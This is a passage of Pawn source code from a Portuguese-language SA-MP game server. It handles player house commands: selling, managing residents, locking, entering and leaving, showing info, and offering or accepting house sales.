					format(gstring, sizeof(gstring), "Casa ID {FFFFFF}%d{FFFF00}, localizada em {FFFFFF}%s{FFFF00}, vendida por {FFFFFF}%s", CasaInfo[c][Numero], zone, PlayerName(playerid));
					SendClientMessageToAll(0xFFFF00FF, gstring);
					WE_SetInt(gFile, "Casa", -1);
               		WE_SetInt(gFile, "Impostos", 0);
            		WE_SetInt(gFile, "Atrasados", 0);
            		WE_SetInt(gFile, "Spawn", 0);
					pInfo[playerid][Spawn] = 0;
					new
						strC[128]
					;
                    if(strcmp(CasaInfo[c][Morador], "Ninguem", false))
                    {
                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador]);
						WE_SetInt(strC, "MorandoID", -1);
						WE_SetInt(strC, "Spawn", 0);
                    }
                    if(strcmp(CasaInfo[c][Morador2], "Ninguem", false))
                    {
                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador2]);
						WE_SetInt(strC, "MorandoID", -1);
						WE_SetInt(strC, "Spawn", 0);
                    }
                    if(strcmp(CasaInfo[c][Morador3], "Ninguem", false))
                    {
                        format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[c][Morador3]);
						WE_SetInt(strC, "MorandoID", -1);
						WE_SetInt(strC, "Spawn", 0);
                    }
			        DestroyPickup(CasaPickup[c]);
					CasaPickup[c] = CreatePickup(1273, 23, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]);
					format(CasaInfo[c][Proprietario], 12, "Ninguem");
					format(CasaInfo[c][Morador], 12, "Ninguem");
					format(CasaInfo[c][Morador2], 12, "Ninguem");
					format(CasaInfo[c][Morador3], 12, "Ninguem");
					format(CasaInfo[c][Login], 12, "00/00/0000");
					format(CasaInfo[c][Horario], 12, "00:00:00");
					format(CasaInfo[c][Mensagem], 6, "Nada");
                    CasaInfo[c][Status] = 0;
					WE_SetString(hFile, "Proprietario", "Ninguem");
					WE_SetString(hFile, "Morador", "Ninguem");
					WE_SetString(hFile, "Morador2", "Ninguem");
					WE_SetString(hFile, "Morador3", "Ninguem");
					WE_SetString(hFile, "Login", "00/00/0000");
					WE_SetString(hFile, "Horario", "00:00:00");
					WE_SetString(hFile, "Mensagem", "Nada");
                    WE_SetString(hFile, "Status", "0");
                    WE_SetString(hFile, "Dono", "0");
					if(WE_GetInt(hFile, "CarModel") != 0)
					{
					    new
							vcasaModelo = WE_GetInt(hFile, "CarModel")
						;
                     	switch(vcasaModelo)
						{
							case 400: vPreco[playerid] = PRECO_LANDSTALKER;
							case 401: vPreco[playerid] = PRECO_BRAVURA;
							case 402: vPreco[playerid] = PRECO_BUFFALO;
							case 404: vPreco[playerid] = PRECO_PERENNIEL;
							case 409: vPreco[playerid] = PRECO_STRETCH;
							case 411: vPreco[playerid] = PRECO_INFERNUS;
							case 412: vPreco[playerid] = PRECO_VOODOO;
							case 415: vPreco[playerid] = PRECO_CHEETAH;
							case 418: vPreco[playerid] = PRECO_MOONBEAM;
							case 419: vPreco[playerid] = PRECO_ESPERANTO;
							case 421: vPreco[playerid] = PRECO_WASHINGTON;
							case 422: vPreco[playerid] = PRECO_BOBCAT;
							case 424: vPreco[playerid] = PRECO_BF_INJECTION;
							case 429: vPreco[playerid] = PRECO_BANSHEE;
							case 434: vPreco[playerid] = PRECO_HOTKNIFE;
							case 445: vPreco[playerid] = PRECO_ADMIRAL;
							case 451: vPreco[playerid] = PRECO_TURISMO;
							case 461: vPreco[playerid] = PRECO_PCJ_600;
							case 462: vPreco[playerid] = PRECO_FAGGIO;
							case 463: vPreco[playerid] = PRECO_FREEWAY;
							case 466: vPreco[playerid] = PRECO_GLENDALE;
							case 468: vPreco[playerid] = PRECO_SANCHEZ;
							case 471: vPreco[playerid] = PRECO_QUAD;
							case 474: vPreco[playerid] = PRECO_HERMES;
							case 475: vPreco[playerid] = PRECO_SABRE;
							case 477: vPreco[playerid] = PRECO_ZR_350;
							case 478: vPreco[playerid] = PRECO_WALTON;
							case 480: vPreco[playerid] = PRECO_COMET;
							case 481: vPreco[playerid] = PRECO_BMX;
							case 482: vPreco[playerid] = PRECO_BURRITO;
							case 483: vPreco[playerid] = PRECO_CAMPER;
							case 489: vPreco[playerid] = PRECO_RANCHER;
							case 491: vPreco[playerid] = PRECO_VIRGO;
							case 492: vPreco[playerid] = PRECO_GREENWOOD;
							case 494: vPreco[playerid] = PRECO_HOTRING;
							case 495: vPreco[playerid] = PRECO_SANDKING;
							case 496: vPreco[playerid] = PRECO_BLISTA_COMPACT;
							case 498: vPreco[playerid] = PRECO_BOXVILLE;
							case 500: vPreco[playerid] = PRECO_MESA;
							case 504: vPreco[playerid] = PRECO_BLOODRING_BANGER;
							case 505: vPreco[playerid] = PRECO_RANCHER;
							case 506: vPreco[playerid] = PRECO_SUPER_GT;
							case 507: vPreco[playerid] = PRECO_ELEGANT;
							case 509: vPreco[playerid] = PRECO_BIKE;
							case 517: vPreco[playerid] = PRECO_MAJESTIC;
							case 518: vPreco[playerid] = PRECO_BUCCANEER;
							case 521: vPreco[playerid] = PRECO_FCR_900;
							case 522: vPreco[playerid] = PRECO_NRG_500;
							case 529: vPreco[playerid] = PRECO_WILLARD;
							case 533: vPreco[playerid] = PRECO_FELTZER;
							case 534: vPreco[playerid] = PRECO_REMINGTON;
							case 535: vPreco[playerid] = PRECO_SLAMVAM;
							case 536: vPreco[playerid] = PRECO_BLADE;
							case 540: vPreco[playerid] = PRECO_VINCENT;
       						case 541: vPreco[playerid] = PRECO_BULLET;
							case 542: vPreco[playerid] = PRECO_CLOVER;
							case 543: vPreco[playerid] = PRECO_SADLER;
							case 545: vPreco[playerid] = PRECO_HUSTLER;
							case 550: vPreco[playerid] = PRECO_SUNRISE;
							case 554: vPreco[playerid] = PRECO_YOSEMITE;
       						case 558: vPreco[playerid] = PRECO_URANOS;
							case 559: vPreco[playerid] = PRECO_JESTER;
							case 560: vPreco[playerid] = PRECO_SULTAN;
							case 561: vPreco[playerid] = PRECO_STRATUM;
							case 562: vPreco[playerid] = PRECO_ELEGY;
							case 565: vPreco[playerid] = PRECO_FLASH;
							case 567: vPreco[playerid] = PRECO_SAVANNA;
							case 568: vPreco[playerid] = PRECO_BANDITO;
							case 571: vPreco[playerid] = PRECO_KART;
							case 575: vPreco[playerid] = PRECO_BROADWAY;
							case 576: vPreco[playerid] = PRECO_TORNADO;
							case 579: vPreco[playerid] = PRECO_HUNTLEY;
							case 580: vPreco[playerid] = PRECO_STAFFORD;
							case 581: vPreco[playerid] = PRECO_BF_400;
							case 585: vPreco[playerid] = PRECO_EMPEROR;
							case 586: vPreco[playerid] = PRECO_WAYFARER;
							case 587: vPreco[playerid] = PRECO_EUROS;
							case 589: vPreco[playerid] = PRECO_CLUB;
							case 600: vPreco[playerid] = PRECO_PICADOR;
							case 602: vPreco[playerid] = PRECO_ALPHA;
							case 603: vPreco[playerid] = PRECO_PHOENIX;
							case 604: vPreco[playerid] = PRECO_GLENDALE;
							case 605: vPreco[playerid] = PRECO_SADLER;
							case 609: vPreco[playerid] = PRECO_BOXVILLE;
						}
     					sGivePlayerCash(playerid, vPreco[playerid] * 90 / 100);
						format(gStr, sizeof(gStr), "Você recebeu o valor de R$%d pelo veículo %s que foi vendido com sua casa.", (vPreco[playerid] * 90 / 100), vNome[WE_GetInt(hFile, "CarModel")-400]);
						SendClientMessage(playerid, AZUL_WE, gStr);
						vPreco[playerid] = 0;
					}
					WE_SetString(hFile, "vNome", "Veículo Casa");
					WE_SetInt(hFile, "CarModel", 0);
					WE_SetInt(hFile, "Cor1", 0);
					WE_SetInt(hFile, "Cor2", 0);
					cInfo[CasaInfo[c][Numero]][CarModel] = 0;
					cInfo[CasaInfo[c][Numero]][Cor1] = 0;
					cInfo[CasaInfo[c][Numero]][Cor2] = 0;
     				Update3DTextLabelText(cInfo[CasaInfo[c][Numero]][Label], -1, "   ");
     				SetVehicleVirtualWorld(cInfo[CasaInfo[c][Numero]][HouseCar], 999);
     				new
						casacom[128]
					;
					format(casacom, sizeof(casacom), "%s vendeu a casa %d | %s | %s", PlayerName(playerid), CasaInfo[c][Numero], Gdata(), Ghora());
					casaComprou(casacom);

					pInfo[playerid][Casa] = -1;

					format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {FFFFFF}- {00FF00}Sem dono(a)\n{FFFFFF}/Casa Info", CasaInfo[c][Numero]);
					Update3DTextLabelText(CasaLabel[c], COR_BRANCO, gStr);

					return 1;
			    }
			}
			return 1;
        }
		else if(!strcmp(tmp, "morador", true))
   		{
     		for(new c; c < MAX_CASAS; ++c)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
			    {
					if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
	       			{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
		 			if(!strcmp(CasaInfo[c][Morador], "Ninguem", true) || !strcmp(CasaInfo[c][Morador2], "Ninguem", true) || !strcmp(CasaInfo[c][Morador3], "Ninguem", true))
		 			{
		            	tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Morador [ID]");
							return 1;
						}
						new
							id = strval(tmp)
						;
						if(GetDistanceBetweenPlayers(playerid, id) > 5)
						{
							SendClientFormat(playerid, COR_ERRO, "%s está muito longe da casa, peça para ele(a) ficar próximo da porta da casa!", PlayerName(id));
							return 1;
						}
						if(!IsPlayerConnected(id))
						{
							SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
							return 1;
						}
						if(playerid == id)
						{
							SendClientMessage(playerid, COR_ERRO, "Você não pode por você mesmo de morador da sua casa!");
							return 1;
						}
						format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
						new
							CasaMID = WE_GetInt(gFile, "Casa")
						;
						if(CasaMID > 0)
						{
						    format(gStr, sizeof(gStr), "Casas/casa%d.ini", CasaMID);
						    if(fexist(gStr))
						    {
						        if(!strcmp(PlayerName(id), CasaInfo[CasaMID][Proprietario], true))
						        {
						            SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) já é dono(a) de uma casa!");
						            return 1;
						        }
						        else
						        {
						            WE_SetInt(gFile, "Casa", -1);
						        }
						    }
						}
						else
						{
		     				new
								CasaMMID = WE_GetInt(gFile, "MorandoID")
							;
							if(CasaMMID > 0)
							{
							    format(gStr, sizeof(gStr), "Casas/casa%d.ini", CasaMMID);
							    if(fexist(gStr))
							    {
							        if(!strcmp(PlayerName(id), CasaInfo[CasaMMID][Morador], true) || !strcmp(CasaInfo[CasaMMID][Morador2], PlayerName(playerid), true) || !strcmp(CasaInfo[CasaMMID][Morador3], PlayerName(playerid), true))
							        {
							            SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) já mora em uma casa!");
							            return 1;
							        }
							        else
							        {
							            WE_SetInt(gFile, "MorandoID", -1);
							        }
							    }
							}
						}
						format(gstring, sizeof(gstring), "%s está convidando você para morar na casa dele(a), use: (/Aceitar | /Recusar)", PlayerName(playerid));
						SendClientMessage(id, AZUL_WE, gstring);
						format(gstring, sizeof(gstring), "Você está convidando %s para morar em sua casa.", PlayerName(id));
						SendClientMessage(playerid, AZUL_WE, gstring);
						MoradorCasaID[id] = playerid;
						AceitarMorador[id] = CasaInfo[c][Numero];
						MoradorCount[id] = 5;
						T_Morador[id] = SetTimerEx("MensagemMorador", 3000, false, "d", id);
					}
					else
					{
						SendClientMessage(playerid, COR_ERRO, "Sua casa já possui 3 moradores, não há mais espaço para mais moradores!");
					}
					return 1;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "remover", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
			     	tmp = strtok(cmdtext, idx);
		  			if(!strlen(tmp))
		  			{
		  			    SendClientMessage(playerid, COR_ERRO, "Opções: 1 = Morador 1 - 2 = Morador 2 - 3 = Morador 3");
		  			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Remover {FFFFFF}[Número do morador]");
						return 1;
					}
			       	else if(!strcmp(tmp, "1", true))
			       	{
     					if(!strcmp(CasaInfo[c][Morador], "Ninguem", true))
						{
      			   			SendClientMessage(playerid, COR_ERRO, "Não tem nenhum morador na vaga 1!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "O morador %s foi removido da sua casa com sucesso!", CasaInfo[c][Morador]);
                        format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[c][Morador]);
						WE_SetInt(gFile, "MorandoID", -1);
						WE_SetInt(gFile, "Spawn", 0);
     					format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						format(CasaInfo[c][Morador], 64, "Ninguem");
						WE_SetString(hFile, "Morador", "Ninguem");
						return 1;
					}
			       	else if(!strcmp(tmp, "2", true))
			       	{
     					if(!strcmp(CasaInfo[c][Morador2], "Ninguem", true))
						{
      			   			SendClientMessage(playerid, COR_ERRO, "Não tem nenhum morador na vaga 1!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "O morador %s foi removido da sua casa com sucesso!", CasaInfo[c][Morador2]);
                        format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[c][Morador2]);
						WE_SetInt(gFile, "MorandoID", -1);
						WE_SetInt(gFile, "Spawn", 0);
     					format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						format(CasaInfo[c][Morador2], 64, "Ninguem");
						WE_SetString(hFile, "Morador2", "Ninguem");
						return 1;
					}
			       	else if(!strcmp(tmp, "3", true))
			       	{
     					if(!strcmp(CasaInfo[c][Morador3], "Ninguem", true))
						{
      			   			SendClientMessage(playerid, COR_ERRO, "Não tem nenhum morador na vaga 1!");
							return 1;
						}
						SendClientFormat(playerid, COR_AMARELO, "O morador %s foi removido da sua casa com sucesso!", CasaInfo[c][Morador3]);
                        format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[c][Morador3]);
						WE_SetInt(gFile, "MorandoID", -1);
						WE_SetInt(gFile, "Spawn", 0);
     					format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
						format(CasaInfo[c][Morador3], 64, "Ninguem");
						WE_SetString(hFile, "Morador3", "Ninguem");
						return 1;
					}
				}
			}
		}
		else if(!strcmp(tmp, "revogar", true))
		{
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					if(strcmp(CasaInfo[c][Morador], PlayerName(playerid), false) &&
					    strcmp(CasaInfo[c][Morador2], PlayerName(playerid), false) &&
					    strcmp(CasaInfo[c][Morador3], PlayerName(playerid), false))
                    {
                    	SendClientMessage(playerid, COR_ERRO, "Você não mora nessa casa!");
                    	return 1;
                    }
					format(gStr, sizeof(gStr), "%s, você revogou a sua moradia na casa ID %d.", PlayerName(playerid), CasaInfo[c][Numero]);
					SendClientMessage(playerid, COR_AMARELO, gStr);
					format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
					if(strcmp(CasaInfo[c][Morador], PlayerName(playerid), true) == 0)
					{
						format(CasaInfo[c][Morador], 64, "Ninguem");
						WE_SetString(hFile, "Morador", "Ninguem");
					}
					if(strcmp(CasaInfo[c][Morador2], PlayerName(playerid), true) == 0)
					{
						format(CasaInfo[c][Morador2], 64, "Ninguem");
						WE_SetString(hFile, "Morador2", "Ninguem");
					}
					if(strcmp(CasaInfo[c][Morador3], PlayerName(playerid), true) == 0)
					{
						format(CasaInfo[c][Morador3], 64, "Ninguem");
						WE_SetString(hFile, "Morador3", "Ninguem");
					}
					format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
					WE_SetInt(gFile, "MorandoID", -1);
					WE_SetInt(gFile, "Spawn", 0);
					pInfo[playerid][Spawn] = 0;
					return 1;
				}
			}
		}
        else if(!strcmp(tmp, "abrir", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
                    if(CasaInfo[c][Status] == 0)
					{
					    SendClientMessage(playerid, COR_ERRO, "Sua casa já está aberta!");
						return 1;
					}
					SendClientMessage(playerid, COR_AMARELO, "Você abriu sua casa!");
                    format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
                    WE_SetInt(hFile, "Status", 0);
                    CasaInfo[c][Status] = 0;
                    return 1;
                }
            }
        }
        else if(!strcmp(tmp, "fechar", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
                    if(CasaInfo[c][Status] == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Sua casa já está fechada!");
						return 1;
					}
					SendClientMessage(playerid, COR_AMARELO, "Você fechou sua casa!");
                    format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
                    WE_SetInt(hFile, "Status", 1);
                    CasaInfo[c][Status] = 1;
                    return 1;
                }
            }
        }
        else if(!strcmp(tmp, "entrar", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
                    if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false) &&
						strcmp(CasaInfo[c][Morador], PlayerName(playerid), false) &&
						strcmp(CasaInfo[c][Morador2], PlayerName(playerid), false) &&
						strcmp(CasaInfo[c][Morador3], PlayerName(playerid), false))
                    {
                    	if(CasaInfo[c][Status] == 1)
						{
						    SendClientMessage(playerid, COR_ERRO, "Essa casa está fechada!");
							return 1;
						}
					}
					InHouse[playerid] = CasaInfo[c][Numero];
					if(strcmp(CasaInfo[InHouse[playerid]][Proprietario], PlayerName(playerid), true) == 0)
					{
					    format(gStr, sizeof(gStr), "Olá %s, você está na sua casa ID %d.", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero]);
						SendClientMessage(playerid, AZUL_WE, gStr);
                	}
					else
					{
						format(gStr, sizeof(gStr), "Olá %s, você está na casa ID %d, que pertence à %s", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero], CasaInfo[InHouse[playerid]][Proprietario]);
						SendClientMessage(playerid, AZUL_WE, gStr);
					}
    				SetPlayerPos(playerid, CasaInfo[c][InteriorX], CasaInfo[c][InteriorY], CasaInfo[c][InteriorZ]);
                    SetPlayerVirtualWorld(playerid, CasaInfo[c][VirtualWorld]);
                    SetPlayerInterior(playerid, CasaInfo[c][InteriorID]);
                	EntrouCasa[playerid] = 1;
                	return 1;
                }
            }
            return 1;
        }
        else if(!strcmp(tmp, "sair", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(EntrouCasa[playerid] == 1)
                {
	           		if(InHouse[playerid] == -1)
	   				{
	   				    SendClientMessage(playerid, COR_ERRO, "Você não está dentro de uma casa!");
					   	return 1;
					}
	         	    if(!IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[InHouse[playerid]][InteriorX], CasaInfo[InHouse[playerid]][InteriorY], CasaInfo[InHouse[playerid]][InteriorZ]))
	         	    {
	         	        SendClientMessage(playerid, COR_ERRO, "Você está longe da porta!");
	         	        return 1;
	         	    }
					if(strcmp(CasaInfo[InHouse[playerid]][Proprietario], PlayerName(playerid), true) == 0)
					{
					    format(gStr, sizeof(gStr), "%s, você saiu da sua casa ID %d.", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero]);
					    SendClientMessage(playerid, AZUL_WE, gStr);
                	}
					else
					{
					    format(gStr, sizeof(gStr), "%s, você saiu da casa ID %d, que pertence à %s", PlayerName(playerid), CasaInfo[InHouse[playerid]][Numero], CasaInfo[InHouse[playerid]][Proprietario]);
                        SendClientMessage(playerid, AZUL_WE, gStr);
					}
	     			SetPlayerPos(playerid, CasaInfo[InHouse[playerid]][PickupX], CasaInfo[InHouse[playerid]][PickupY], CasaInfo[InHouse[playerid]][PickupZ]);
	     			SetPlayerVirtualWorld(playerid, 0);
	            	SetPlayerInterior(playerid, 0);
	            	if(IsCasaIlha(CasaInfo[InHouse[playerid]][Numero]))
					{
						TogglePlayerControllable(playerid, false);
						SetTimerEx("DescongelarIlha", 5000, false, "d", playerid);
					}
					EntrouCasa[playerid] = 0;
	     			InHouse[playerid] = -1;
				 	return 1;
			 	}
            }
            return 1;
  		}
        else if(!strcmp(tmp, "info", true))
        {
            for(new c; c < MAX_CASAS; ++c)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					new
				        stg[1024]
					;
					format(gStr, 128, "{1E90FF}Casa {FFFFFF}ID %d  {FFFFFF}Valor:{06EE45} R$%d", CasaInfo[c][Numero], CasaInfo[c][Preco]);
					strcat(stg, gStr);
					format(gStr, 128, "\n{1E90FF}Dono(a) {FF0000}%s {FFFFFF} Último Login %s", CasaInfo[c][Proprietario], CasaInfo[c][Login]);
			        strcat(stg, gStr);

			        if(!strcmp(CasaInfo[c][Morador], "Ninguem", false))
			        {
				        strcat(stg, "\n{1E90FF}Morador(a) 1 {FFFFFF}Ninguém");
			        }
			        else
			        {
			        	format(gStr, 128, "\n{1E90FF}Morador(a) 1 {FFFFFF}%s", CasaInfo[c][Morador]);
				        strcat(stg, gStr);
			        }
			        if(!strcmp(CasaInfo[c][Morador2], "Ninguem", false))
			        {
				        strcat(stg, "\n{1E90FF}Morador(a) 2 {FFFFFF}Ninguém");
			        }
			        else
			        {
			        	format(gStr, 128, "\n{1E90FF}Morador(a) 2 {FFFFFF}%s", CasaInfo[c][Morador2]);
				        strcat(stg, gStr);
			        }
			        if(!strcmp(CasaInfo[c][Morador3], "Ninguem", false))
			        {
				        strcat(stg, "\n{1E90FF}Morador(a) 3 {FFFFFF}Ninguém");
			        }
			        else
			        {
			        	format(gStr, 128, "\n{1E90FF}Morador(a) 3 {FFFFFF}%s", CasaInfo[c][Morador3]);
				        strcat(stg, gStr);
			        }
					ShowPlayerDialog(playerid, D_iCASA, DIALOG_STYLE_MSGBOX, "{FFFFFF}Informações da casa", stg, "OK", "");
					break;
            	}
			}
        }
        else if(!strcmp(tmp, "oferecer", true))
		{
			for(new c; c < MAX_CASAS; ++c)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
		       		if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
		       		{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
					tmp = strtok(cmdtext, idx);
				  	if(!strlen(tmp))
					{
						SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Oferecer [ID] [Preço]");
					 	return 1;
					}
				 	new
					 	id = strval(tmp)
				 	;
					tmp = strtok(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casa Oferecer [ID] [Preço]");
					 	return 1;
					}
					new
						preco = strval(tmp)
					;
					if(!IsPlayerConnected(id))
					{
					  	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
					 	return 1;
					}
                	if(GetDistanceBetweenPlayers(playerid, id) > 5)
	   				{
  						SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender a casa está muito distânte!");
						return 1;
					}
	   				if(GetPlayerCash(id) < preco)
					{
					  	SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender a casa não tem dinheiro suficiente!");
					 	return 1;
					}
	                format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
	                if(WE_GetInt(gFile, "Casa") != -1)
	                {
                	  	SendClientFormat(playerid, COR_ERRO, "%s já possui uma casa!", PlayerName(id));
					 	return 1;
	                }
	      			if(WE_GetInt(gFile, "MorandoID") != -1)
	                {
	                	SendClientFormat(playerid, COR_ERRO, "%s é morador(a) de uma casa!", PlayerName(id));
					 	return 1;
	                }
					format(gStr, sizeof(gStr), "%s está lhe oferecendo a casa ID %d, por R$%d. (Use: '/Casa Aceitar' ou '/Casa Recusar')", PlayerName(playerid), CasaInfo[c][Numero], preco);
					SendClientMessage(id, COR_AMARELO, gStr);
					format(gStr, sizeof(gStr), "Você está oferecendo sua casa ID %d, para %s, por R$%d", CasaInfo[c][Numero], PlayerName(id), preco);
					SendClientMessage(playerid, COR_AMARELO, gStr);
					RecebeuCasa[id] = playerid;
					Vendedor[playerid] = playerid;
					CasaOferecida[id] = true;
					LiberadoCasa[id] = 1;
					HouseIP = CasaInfo[c][Numero];
					MoneyHouse[RecebeuCasa[id]] = preco;
					return 1;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "aceitar", true))
		{
			if(CasaOferecida[playerid] == false)
			{
				SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo casa para você!");
				return 1;
			}
			if(GetPlayerCash(playerid) < (MoneyHouse[RecebeuCasa[playerid]]))
			{
				SendClientMessage(playerid, COR_ERRO, "Não toleramos a prática de bugar. Banido.");
				SendClientMessage(playerid, AZUL_WE, "Para mais informações, contate a administração.");
				return BanEx(playerid, "BUG HOUSE");
			}
   			if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[HouseIP][PickupX], CasaInfo[HouseIP][PickupY], CasaInfo[HouseIP][PickupZ]))
			{
			    if(!strcmp(CasaInfo[HouseIP][Proprietario], "Ninguem", true))
			    {
			        SendClientMessage(playerid, COR_ERRO, "A casa já foi vendida!");
					return 1;
			    }
				new
					zone[MAX_ZONE_NAME]
				;
				GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
				format(gstring, sizeof(gstring), "Casa ID {FFFFFF}%d{FFFF00}, localizada em {FFFFFF}%s{FFFF00}, comprada por {FFFFFF}%s", CasaInfo[HouseIP][Numero], zone, CasaInfo[HouseIP][Proprietario]);
				SendClientMessageToAll(0xE86B3FFF, gstring);
				format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[HouseIP][Numero]);
				format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[HouseIP][Proprietario]);
				pInfo[Vendedor[playerid]][Spawn] = 2;
				WE_SetInt(gFile, "Casa", -1);
				WE_SetInt(gFile, "Spawn", 0);
               	WE_SetInt(gFile, "Impostos", 0);
          		WE_SetInt(gFile, "Atrasados", 0);
				new
					strC[128]
				;
           		if(strcmp(CasaInfo[HouseIP][Morador], "Ninguem", false))
           		{
					format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[HouseIP][Morador]);
					WE_SetInt(strC, "MorandoID", -1);
					WE_SetInt(strC, "Spawn", 0);
				}
				if(strcmp(CasaInfo[HouseIP][Morador2], "Ninguem", false))
				{
					format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[HouseIP][Morador2]);
					WE_SetInt(strC, "MorandoID", -1);
					WE_SetInt(strC, "Spawn", 0);
				}
				if(strcmp(CasaInfo[HouseIP][Morador3], "Ninguem", false))
				{
					format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[HouseIP][Morador3]);
					WE_SetInt(strC, "MorandoID", -1);
					WE_SetInt(strC, "Spawn", 0);
				}
				DestroyPickup(CasaPickup[HouseIP]);
				CasaPickup[HouseIP] = CreatePickup(1273, 23, CasaInfo[HouseIP][PickupX], CasaInfo[HouseIP][PickupY], CasaInfo[HouseIP][PickupZ]);
				format(CasaInfo[HouseIP][Proprietario], 12, "Ninguem");
				WE_SetString(hFile, "Proprietario", "Ninguem");
				format(CasaInfo[HouseIP][Morador], 12, "Ninguem");
				WE_SetString(hFile, "Morador", "Ninguem");
				format(CasaInfo[HouseIP][Morador2], 12, "Ninguem");
				WE_SetString(hFile, "Morador2", "Ninguem");
				format(CasaInfo[HouseIP][Morador3], 12, "Ninguem");
				WE_SetString(hFile, "Morador3", "Ninguem");
				format(CasaInfo[HouseIP][Login], 12, "00/00/0000");
				WE_SetString(hFile, "Login", "00/00/0000");
				format(CasaInfo[HouseIP][Mensagem], 12, "Nada");
				WE_SetString(hFile, "Horario", "00:00:00");
				format(CasaInfo[HouseIP][Horario], 12, "00:00:00");
				WE_SetString(hFile, "Mensagem", "Nada");
				WE_SetInt(hFile, "Status", 0);
				CasaInfo[HouseIP][Status] = 0;
				WE_SetInt(hFile, "Dono", 0);
				WE_SetInt(hFile, "Cor1", 0);
				WE_SetInt(hFile, "Cor2", 0);
				WE_SetString(hFile, "vNome", "Veículo Casa");
				WE_SetInt(hFile, "newSpawn", 0);
				sGivePlayerCash(RecebeuCasa[playerid], (MoneyHouse[RecebeuCasa[playerid]]));
				sGivePlayerCash(playerid, (-MoneyHouse[RecebeuCasa[playerid]]));
